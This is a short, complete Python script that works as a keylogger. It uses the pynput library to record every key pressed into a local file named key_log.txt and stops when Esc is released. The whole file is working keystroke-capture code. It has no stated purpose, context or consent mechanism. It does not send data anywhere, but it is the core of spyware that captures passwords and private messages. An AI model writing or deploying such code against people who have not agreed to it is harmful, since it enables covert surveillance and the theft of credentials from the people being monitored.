import pynput
from pynput.keyboard import Key, Listener

# File to save keystrokes
log_file = "key_log.txt"

# Function to log the keystrokes
def on_press(key):
    try:
        # Record the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f" {str(key)} ")

# Stop the keylogger when the 'Esc' key is pressed
def on_release(key):
    if key == Key.esc:
        return False

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()